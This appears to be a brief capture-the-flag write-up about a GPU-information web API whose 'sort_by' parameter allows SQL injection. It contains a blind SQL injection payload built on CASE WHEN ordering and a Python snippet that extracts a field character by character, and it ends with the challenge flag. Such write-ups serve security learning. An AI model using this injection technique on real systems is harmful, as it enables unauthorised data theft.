## observations
web api exposing gpu information allows sorting by arbitrary fields \
first thought is that i want to get the fields of the GPU named `RGB 6090` which should have the flag \
we observe that the `sort_by` parameter is vulnerable to sqli

## attack vector
exploit the `sort_by` parameter: \
```sort_by=CASE WHEN <condition> THEN name ELSE id END``` \
if the condition is true, results sort by name \
if the condition is false, results sort by id \
since $log_2 \ 95$ is around $7$ it will only take $7$ guesses per character \
we can construct as follows:
```
q = f"(SELECT SUBSTR(architecture, {i}, 1) FROM gpus WHERE name='{target}') > '{esc}'"
p = {'sort_by': f"CASE WHEN {q} THEN name ELSE id END", 'sort_order': 'asc', 'page': 1, 'per_page': 9}
```
the rest is trivial and we get the flag

## flag

`Cyberthon{M04R_AYY_E11_4ND_RGB_M34N5_B33G_FP5_1NCR3453}`